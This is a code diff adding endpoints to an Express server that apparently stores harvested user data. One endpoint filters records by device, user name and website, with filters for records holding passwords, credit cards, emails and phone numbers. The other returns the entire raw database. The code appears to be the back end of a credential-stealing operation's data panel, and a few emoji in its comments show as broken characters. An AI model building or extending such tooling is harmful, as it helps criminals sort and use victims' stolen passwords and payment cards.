@@ -2637,7 +2637,85 @@ app.get('/api/user-data/stream', (req, res) => {
     }
 });
 
-// 📈 STATS - Overall system statistics
+// � DATABASE QUERY - Query the database with filters
+app.post('/api/database/query', rateLimit, requireAuth, (req, res) => {
+    try {
+        const { filter, limit = 100, sort } = req.body;
+        
+        let results = database.data.records || [];
+        
+        // Apply filters if provided
+        if (filter) {
+            if (filter.deviceId) {
+                results = results.filter(r => r.deviceId && r.deviceId.includes(filter.deviceId));
+            }
+            if (filter.userName) {
+                results = results.filter(r => r.userName && r.userName.toLowerCase().includes(filter.userName.toLowerCase()));
+            }
+            if (filter.website) {
+                results = results.filter(r => r.website && r.website.includes(filter.website));
+            }
+            if (filter.hasEmails) {
+                results = results.filter(r => r.emails && r.emails.length > 0);
+            }
+            if (filter.hasPasswords) {
+                results = results.filter(r => r.passwords && r.passwords.length > 0);
+            }
+            if (filter.hasCreditCards) {
+                results = results.filter(r => r.creditCards && r.creditCards.length > 0);
+            }
+            if (filter.hasPhones) {
+                results = results.filter(r => r.phones && r.phones.length > 0);
+            }
+            if (filter.dateFrom) {
+                results = results.filter(r => new Date(r.timestamp) >= new Date(filter.dateFrom));
+            }
+            if (filter.dateTo) {
+                results = results.filter(r => new Date(r.timestamp) <= new Date(filter.dateTo));
+            }
+        }
+        
+        // Apply sorting if provided
+        if (sort) {
+            if (sort.field === 'timestamp') {
+                results.sort((a, b) => {
+                    const dateA = new Date(a.timestamp);
+                    const dateB = new Date(b.timestamp);
+                    return sort.order === 'asc' ? dateA - dateB : dateB - dateA;
+                });
+            }
+        }
+        
+        // Apply limit
+        results = results.slice(0, limit);
+        
+        res.json({
+            success: true,
+            count: results.length,
+            results,
+            query: { filter, limit, sort }
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// 📊 DATABASE RAW - Get raw database (admin only)
+app.get('/api/database/raw', rateLimit, requireAuth, (req, res) => {
+    try {
+        const rawData = database.data;
+        res.json({
+            success: true,
+            database: rawData,
+            size: JSON.stringify(rawData).length,
+            timestamp: new Date().toISOString()
+        });
+    } catch (error) {
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// �📈 STATS - Overall system statistics
 app.get('/api/user-data/stats', rateLimit, requireAuth, (req, res) => {
     try {
         const stats = database.getStats();
